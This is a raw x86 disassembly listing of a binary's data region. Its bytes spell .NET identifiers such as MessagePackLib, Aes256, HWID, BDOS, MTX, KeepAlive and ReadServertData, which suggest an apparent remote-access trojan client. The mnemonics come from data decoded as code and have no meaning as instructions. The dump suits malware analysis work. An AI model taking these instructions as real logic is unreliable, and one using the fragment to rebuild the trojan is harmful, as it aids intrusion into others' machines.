  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 22                	add    %ah,(%edx)
  407705:	0f 15 0f             	unpckhps (%edi),%xmm1
  407708:	2d 0f ef 05 5b       	sub    $0x5b05ef0f,%eax
  40770d:	06                   	push   %es
  40770e:	75 06                	jne    0x407716
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	eb 1b                	jmp    0x40773f
  407724:	01 00                	add    %eax,(%eax)
  407726:	00 01                	add    %al,(%ecx)
  407728:	75 00                	jne    0x40772a
  40772a:	e6 05                	out    %al,$0x5
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	01 1b                	add    %ebx,(%ebx)
  407734:	02 00                	add    (%eax),%al
  407736:	40                   	inc    %eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	c0 08 02             	rorb   $0x2,(%eax)
  40773d:	00 40 01             	add    %al,0x1(%eax)
  407740:	7b 00                	jnp    0x407742
  407742:	7e 0e                	jle    0x407752
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	8d 06                	lea    (%esi),%eax
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	b8 02 00 00 00       	mov    $0x2,%eax
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	ee                   	out    %al,(%dx)
  40778b:	0f 00 00             	sldt   (%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 d4                	add    %dl,%ah
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	48                   	dec    %eax
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 dc                	add    %bl,%ah
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 7f 1a             	add    %bh,0x1a(%edi)
  4077dc:	00 00                	add    %al,(%eax)
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4077ef:	17                   	pop    %ss
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 95 12 00 00 00    	add    %dl,0x12(%ebp)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	49                   	dec    %ecx
  40782f:	45                   	inc    %ebp
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
  407831:	75 6d                	jne    0x4078a0
  407833:	65 72 61             	gs jb  0x407897
  407836:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40783a:	31 00                	xor    %eax,(%eax)
  40783c:	43                   	inc    %ebx
  40783d:	61                   	popa
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	53                   	push   %ebx
  407841:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407848:	69 
  407849:	73 74                	jae    0x4078bf
  40784b:	60                   	pusha
  40784c:	31 00                	xor    %eax,(%eax)
  40784e:	61                   	popa
  40784f:	31 00                	xor    %eax,(%eax)
  407851:	76 31                	jbe    0x407884
  407853:	00 5f 5f             	add    %bl,0x5f(%edi)
  407856:	53                   	push   %ebx
  407857:	74 61                	je     0x4078ba
  407859:	74 69                	je     0x4078c4
  40785b:	63 41 72             	arpl   %eax,0x72(%ecx)
  40785e:	72 61                	jb     0x4078c1
  407860:	79 49                	jns    0x4078ab
  407862:	6e                   	outsb  %ds:(%esi),(%dx)
  407863:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40786a:	69 
  40786b:	7a 65                	jp     0x4078d2
  40786d:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407872:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407879:	74 2e                	je     0x4078a9
  40787b:	57                   	push   %edi
  40787c:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 33                	je     0x4078bb
  407888:	32 00                	xor    (%eax),%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	53                   	push   %ebx
  407893:	77 61                	ja     0x4078f6
  407895:	70 49                	jo     0x4078e0
  407897:	6e                   	outsb  %ds:(%esi),(%dx)
  407898:	74 33                	je     0x4078cd
  40789a:	32 00                	xor    (%eax),%al
  40789c:	3c 3e                	cmp    $0x3e,%al
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	5f                   	pop    %edi
  4078a0:	5f                   	pop    %edi
  4078a1:	32 00                	xor    (%eax),%al
  4078a3:	61                   	popa
  4078a4:	32 00                	xor    (%eax),%al
  4078a6:	58                   	pop    %eax
  4078a7:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078ac:	72 74                	jb     0x407922
  4078ae:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078b5:	32 00                	xor    (%eax),%al
  4078b7:	76 32                	jbe    0x4078eb
  4078b9:	00 76 33             	add    %dh,0x33(%esi)
  4078bc:	00 57 72             	add    %dl,0x72(%edi)
  4078bf:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078c6:	36 
  4078c7:	34 00                	xor    $0x0,%al
  4078c9:	54                   	push   %esp
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	55                   	push   %ebp
  4078cc:	49                   	dec    %ecx
  4078cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ce:	74 36                	je     0x407906
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	47                   	inc    %edi
  4078d3:	65 74 41             	gs je  0x407917
  4078d6:	73 55                	jae    0x40792d
  4078d8:	49                   	dec    %ecx
  4078d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078da:	74 36                	je     0x407912
  4078dc:	34 00                	xor    $0x0,%al
  4078de:	53                   	push   %ebx
  4078df:	65 74 41             	gs je  0x407923
  4078e2:	73 55                	jae    0x407939
  4078e4:	49                   	dec    %ecx
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	74 36                	je     0x40791e
  4078e8:	34 00                	xor    $0x0,%al
  4078ea:	54                   	push   %esp
  4078eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	53                   	push   %ebx
  4078f3:	77 61                	ja     0x407956
  4078f5:	70 49                	jo     0x407940
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	55                   	push   %ebp
  4078ff:	49                   	dec    %ecx
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 31                	je     0x407934
  407903:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  40790f:	61                   	popa
  407910:	70 49                	jo     0x40795b
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407919:	41                   	inc    %ecx
  40791a:	43                   	inc    %ebx
  40791b:	53                   	push   %ebx
  40791c:	48                   	dec    %eax
  40791d:	41                   	inc    %ecx
  40791e:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407924:	61                   	popa
  407925:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40792b:	73 32                	jae    0x40795f
  40792d:	35 36 00 61 65       	xor    $0x65610036,%eax
  407932:	73 32                	jae    0x407966
  407934:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407939:	53                   	push   %ebx
  40793a:	74 61                	je     0x40799d
  40793c:	74 69                	je     0x4079a7
  40793e:	63 41 72             	arpl   %eax,0x72(%ecx)
  407941:	72 61                	jb     0x4079a4
  407943:	79 49                	jns    0x40798e
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40794d:	69 
  40794e:	7a 65                	jp     0x4079b5
  407950:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407955:	74 5f                	je     0x4079b6
  407957:	55                   	push   %ebp
  407958:	54                   	push   %esp
  407959:	46                   	inc    %esi
  40795a:	38 00                	cmp    %al,(%eax)
  40795c:	3c 4d                	cmp    $0x4d,%al
  40795e:	6f                   	outsl  %ds:(%esi),(%dx)
  40795f:	64 75 6c             	fs jne 0x4079ce
  407962:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407967:	73 73                	jae    0x4079dc
  407969:	61                   	popa
  40796a:	67 65 50             	addr16 gs push %eax
  40796d:	61                   	popa
  40796e:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407971:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407978:	76 61                	jbe    0x4079db
  40797a:	74 65                	je     0x4079e1
  40797c:	49                   	dec    %ecx
  40797d:	6d                   	insl   (%dx),%es:(%edi)
  40797e:	70 6c                	jo     0x4079ec
  407980:	65 6d                	gs insl (%dx),%es:(%edi)
  407982:	65 6e                	outsb  %gs:(%esi),(%dx)
  407984:	74 61                	je     0x4079e7
  407986:	74 69                	je     0x4079f1
  407988:	6f                   	outsl  %ds:(%esi),(%dx)
  407989:	6e                   	outsb  %ds:(%esi),(%dx)
  40798a:	44                   	inc    %esp
  40798b:	65 74 61             	gs je  0x4079ef
  40798e:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  407995:	42 
  407996:	32 41 31             	xor    0x31(%ecx),%al
  407999:	46                   	inc    %esi
  40799a:	39 39                	cmp    %edi,(%ecx)
  40799c:	30 32                	xor    %dh,(%edx)
  40799e:	42                   	inc    %edx
  40799f:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079a5:	38 30                	cmp    %dh,(%eax)
  4079a7:	45                   	inc    %ebp
  4079a8:	46                   	inc    %esi
  4079a9:	31 36                	xor    %esi,(%esi)
  4079ab:	39 32                	cmp    %esi,(%edx)
  4079ad:	43                   	inc    %ebx
  4079ae:	45                   	inc    %ebp
  4079af:	39 39                	cmp    %edi,(%ecx)
  4079b1:	34 37                	xor    $0x37,%al
  4079b3:	41                   	inc    %ecx
  4079b4:	31 39                	xor    %edi,(%ecx)
  4079b6:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079ba:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079bd:	44                   	inc    %esp
  4079be:	38 46 35             	cmp    %al,0x35(%esi)
  4079c1:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079c5:	41                   	inc    %ecx
  4079c6:	37                   	aaa
  4079c7:	32 31                	xor    (%ecx),%dh
  4079c9:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079cf:	43                   	inc    %ebx
  4079d0:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079d5:	43                   	inc    %ebx
  4079d6:	00 45 53             	add    %al,0x53(%ebp)
  4079d9:	5f                   	pop    %edi
  4079da:	53                   	push   %ebx
  4079db:	59                   	pop    %ecx
  4079dc:	53                   	push   %ebx
  4079dd:	54                   	push   %esp
  4079de:	45                   	inc    %ebp
  4079df:	4d                   	dec    %ebp
  4079e0:	5f                   	pop    %edi
  4079e1:	52                   	push   %edx
  4079e2:	45                   	inc    %ebp
  4079e3:	51                   	push   %ecx
  4079e4:	55                   	push   %ebp
  4079e5:	49                   	dec    %ecx
  4079e6:	52                   	push   %edx
  4079e7:	45                   	inc    %ebp
  4079e8:	44                   	inc    %esp
  4079e9:	00 45 53             	add    %al,0x53(%ebp)
  4079ec:	5f                   	pop    %edi
  4079ed:	44                   	inc    %esp
  4079ee:	49                   	dec    %ecx
  4079ef:	53                   	push   %ebx
  4079f0:	50                   	push   %eax
  4079f1:	4c                   	dec    %esp
  4079f2:	41                   	inc    %ecx
  4079f3:	59                   	pop    %ecx
  4079f4:	5f                   	pop    %edi
  4079f5:	52                   	push   %edx
  4079f6:	45                   	inc    %ebp
  4079f7:	51                   	push   %ecx
  4079f8:	55                   	push   %ebp
  4079f9:	49                   	dec    %ecx
  4079fa:	52                   	push   %edx
  4079fb:	45                   	inc    %ebp
  4079fc:	44                   	inc    %esp
  4079fd:	00 4d 61             	add    %cl,0x61(%ebp)
  407a00:	70 4e                	jo     0x407a50
  407a02:	61                   	popa
  407a03:	6d                   	insl   (%dx),%es:(%edi)
  407a04:	65 54                	gs push %esp
  407a06:	6f                   	outsl  %ds:(%esi),(%dx)
  407a07:	4f                   	dec    %edi
  407a08:	49                   	dec    %ecx
  407a09:	44                   	inc    %esp
  407a0a:	00 48 57             	add    %cl,0x57(%eax)
  407a0d:	49                   	dec    %ecx
  407a0e:	44                   	inc    %esp
  407a0f:	00 67 65             	add    %ah,0x65(%edi)
  407a12:	74 5f                	je     0x407a73
  407a14:	46                   	inc    %esi
  407a15:	6f                   	outsl  %ds:(%esi),(%dx)
  407a16:	72 6d                	jb     0x407a85
  407a18:	61                   	popa
  407a19:	74 49                	je     0x407a64
  407a1b:	44                   	inc    %esp
  407a1c:	00 45 58             	add    %al,0x58(%ebp)
  407a1f:	45                   	inc    %ebp
  407a20:	43                   	inc    %ebx
  407a21:	55                   	push   %ebp
  407a22:	54                   	push   %esp
  407a23:	49                   	dec    %ecx
  407a24:	4f                   	dec    %edi
  407a25:	4e                   	dec    %esi
  407a26:	5f                   	pop    %edi
  407a27:	53                   	push   %ebx
  407a28:	54                   	push   %esp
  407a29:	41                   	inc    %ecx
  407a2a:	54                   	push   %esp
  407a2b:	45                   	inc    %ebp
  407a2c:	00 38                	add    %bh,(%eax)
  407a2e:	37                   	aaa
  407a2f:	36 33 39             	xor    %ss:(%ecx),%edi
  407a32:	31 32                	xor    %esi,(%edx)
  407a34:	36 45                	ss inc %ebp
  407a36:	41                   	inc    %ecx
  407a37:	37                   	aaa
  407a38:	37                   	aaa
  407a39:	42                   	inc    %edx
  407a3a:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a40:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a45:	37                   	aaa
  407a46:	44                   	inc    %esp
  407a47:	42                   	inc    %edx
  407a48:	41                   	inc    %ecx
  407a49:	36 37                	ss aaa
  407a4b:	43                   	inc    %ebx
  407a4c:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a51:	46                   	inc    %esi
  407a52:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a57:	39 38                	cmp    %edi,(%eax)
  407a59:	38 38                	cmp    %bh,(%eax)
  407a5b:	45                   	inc    %ebp
  407a5c:	44                   	inc    %esp
  407a5d:	30 37                	xor    %dh,(%edi)
  407a5f:	30 43 44             	xor    %al,0x44(%ebx)
  407a62:	34 30                	xor    $0x30,%al
  407a64:	45                   	inc    %ebp
  407a65:	31 46 36             	xor    %eax,0x36(%esi)
  407a68:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a6e:	67 65 74 5f          	addr16 gs je 0x407ad1
  407a72:	41                   	inc    %ecx
  407a73:	53                   	push   %ebx
  407a74:	43                   	inc    %ebx
  407a75:	49                   	dec    %ecx
  407a76:	49                   	dec    %ecx
  407a77:	00 53 79             	add    %dl,0x79(%ebx)
  407a7a:	73 74                	jae    0x407af0
  407a7c:	65 6d                	gs insl (%dx),%es:(%edi)
  407a7e:	2e 49                	cs dec %ecx
  407a80:	4f                   	dec    %edi
  407a81:	00 49 73             	add    %cl,0x73(%ecx)
  407a84:	58                   	pop    %eax
  407a85:	50                   	push   %eax
  407a86:	00 42 44             	add    %al,0x44(%edx)
  407a89:	4f                   	dec    %edi
  407a8a:	53                   	push   %ebx
  407a8b:	00 45 53             	add    %al,0x53(%ebp)
  407a8e:	5f                   	pop    %edi
  407a8f:	43                   	inc    %ebx
  407a90:	4f                   	dec    %edi
  407a91:	4e                   	dec    %esi
  407a92:	54                   	push   %esp
  407a93:	49                   	dec    %ecx
  407a94:	4e                   	dec    %esi
  407a95:	55                   	push   %ebp
  407a96:	4f                   	dec    %edi
  407a97:	55                   	push   %ebp
  407a98:	53                   	push   %ebx
  407a99:	00 67 65             	add    %ah,0x65(%edi)
  407a9c:	74 5f                	je     0x407afd
  407a9e:	49                   	dec    %ecx
  407a9f:	56                   	push   %esi
  407aa0:	00 73 65             	add    %dh,0x65(%ebx)
  407aa3:	74 5f                	je     0x407b04
  407aa5:	49                   	dec    %ecx
  407aa6:	56                   	push   %esi
  407aa7:	00 47 65             	add    %al,0x65(%edi)
  407aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  407aab:	65 72 61             	gs jb  0x407b0f
  407aae:	74 65                	je     0x407b15
  407ab0:	49                   	dec    %ecx
  407ab1:	56                   	push   %esi
  407ab2:	00 4d 54             	add    %cl,0x54(%ebp)
  407ab5:	58                   	pop    %eax
  407ab6:	00 76 61             	add    %dh,0x61(%esi)
  407ab9:	6c                   	insb   (%dx),%es:(%edi)
  407aba:	75 65                	jne    0x407b21
  407abc:	5f                   	pop    %edi
  407abd:	5f                   	pop    %edi
  407abe:	00 52 65             	add    %dl,0x65(%edx)
  407ac1:	61                   	popa
  407ac2:	64 53                	fs push %ebx
  407ac4:	65 72 76             	gs jb  0x407b3d
  407ac7:	65 72 74             	gs jb  0x407b3e
  407aca:	44                   	inc    %esp
  407acb:	61                   	popa
  407acc:	74 61                	je     0x407b2f
  407ace:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ad2:	61                   	popa
  407ad3:	00 6d 73             	add    %ch,0x73(%ebp)
  407ad6:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ad9:	6c                   	insb   (%dx),%es:(%edi)
  407ada:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407ae1:	65 6d                	gs insl (%dx),%es:(%edi)
  407ae3:	2e 43                	cs inc %ebx
  407ae5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae6:	6c                   	insb   (%dx),%es:(%edi)
  407ae7:	6c                   	insb   (%dx),%es:(%edi)
  407ae8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407aed:	6e                   	outsb  %ds:(%esi),(%dx)
  407aee:	73 2e                	jae    0x407b1e
  407af0:	47                   	inc    %edi
  407af1:	65 6e                	outsb  %gs:(%esi),(%dx)
  407af3:	65 72 69             	gs jb  0x407b5f
  407af6:	63 00                	arpl   %eax,(%eax)
  407af8:	4d                   	dec    %ebp
  407af9:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b00:	74 2e                	je     0x407b30
  407b02:	56                   	push   %esi
  407b03:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b0a:	73 69                	jae    0x407b75
  407b0c:	63 00                	arpl   %eax,(%eax)
  407b0e:	67 65 74 5f          	addr16 gs je 0x407b71
  407b12:	53                   	push   %ebx
  407b13:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b15:	64 53                	fs push %ebx
  407b17:	79 6e                	jns    0x407b87
  407b19:	63 00                	arpl   %eax,(%eax)
  407b1b:	45                   	inc    %ebp
  407b1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407b1d:	64 52                	fs push %edx
  407b1f:	65 61                	gs popa
  407b21:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b25:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b2c:	00 
  407b2d:	54                   	push   %esp
  407b2e:	68 72 65 61 64       	push   $0x64616572
  407b33:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b37:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b3b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b3c:	65 72 41             	gs jb  0x407b80
  407b3f:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b44:	41                   	inc    %ecx
  407b45:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b4b:	61                   	popa
  407b4c:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b52:	74 5f                	je     0x407bb3
  407b54:	43                   	inc    %ebx
  407b55:	6f                   	outsl  %ds:(%esi),(%dx)
  407b56:	6e                   	outsb  %ds:(%esi),(%dx)
  407b57:	6e                   	outsb  %ds:(%esi),(%dx)
  407b58:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b5d:	00 67 65             	add    %ah,0x65(%edi)
  407b60:	74 5f                	je     0x407bc1
  407b62:	49                   	dec    %ecx
  407b63:	73 43                	jae    0x407ba8
  407b65:	6f                   	outsl  %ds:(%esi),(%dx)
  407b66:	6e                   	outsb  %ds:(%esi),(%dx)
  407b67:	6e                   	outsb  %ds:(%esi),(%dx)
  407b68:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b6d:	00 73 65             	add    %dh,0x65(%ebx)
  407b70:	74 5f                	je     0x407bd1
  407b72:	49                   	dec    %ecx
  407b73:	73 43                	jae    0x407bb8
  407b75:	6f                   	outsl  %ds:(%esi),(%dx)
  407b76:	6e                   	outsb  %ds:(%esi),(%dx)
  407b77:	6e                   	outsb  %ds:(%esi),(%dx)
  407b78:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b7d:	00 52 65             	add    %dl,0x65(%edx)
  407b80:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b83:	76 65                	jbe    0x407bea
  407b85:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b89:	74 5f                	je     0x407bea
  407b8b:	47                   	inc    %edi
  407b8c:	75 69                	jne    0x407bf7
  407b8e:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b92:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407b99:	64 
  407b9a:	53                   	push   %ebx
  407b9b:	79 6e                	jns    0x407c0b
  407b9d:	63 3e                	arpl   %edi,(%esi)
  407b9f:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407ba3:	61                   	popa
  407ba4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407ba7:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba8:	67 46                	addr16 inc %esi
  407baa:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bb1:	73 43                	jae    0x407bf6
  407bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb5:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bbb:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc0:	61                   	popa
  407bc1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc5:	67 46                	addr16 inc %esi
  407bc7:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bce:	65 65 70 41          	gs gs jo 0x407c13
  407bd2:	6c                   	insb   (%dx),%es:(%edi)
  407bd3:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407bda:	42                   	inc    %edx
  407bdb:	61                   	popa
  407bdc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bdf:	6e                   	outsb  %ds:(%esi),(%dx)
  407be0:	67 46                	addr16 inc %esi
  407be2:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407be9:	65 61                	gs popa
  407beb:	64 65 72 53          	fs gs jb 0x407c42
  407bef:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bf6:	42                   	inc    %edx
  407bf7:	61                   	popa
  407bf8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bfb:	6e                   	outsb  %ds:(%esi),(%dx)
  407bfc:	67 46                	addr16 inc %esi
  407bfe:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c05:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c0c:	42                   	inc    %edx
  407c0d:	61                   	popa
  407c0e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c11:	6e                   	outsb  %ds:(%esi),(%dx)
  407c12:	67 46                	addr16 inc %esi
  407c14:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c1b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c1f:	61                   	popa
  407c20:	74 65                	je     0x407c87
  407c22:	50                   	push   %eax
  407c23:	6f                   	outsl  %ds:(%esi),(%dx)
  407c24:	6e                   	outsb  %ds:(%esi),(%dx)
  407c25:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c2b:	61                   	popa
  407c2c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c2f:	6e                   	outsb  %ds:(%esi),(%dx)
  407c30:	67 46                	addr16 inc %esi
  407c32:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c39:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3a:	74 65                	je     0x407ca1
  407c3c:	72 76                	jb     0x407cb4
  407c3e:	61                   	popa
  407c3f:	6c                   	insb   (%dx),%es:(%edi)
  407c40:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c45:	61                   	popa
  407c46:	63 6b 69             	arpl   %ebp,0x69(%ebx)
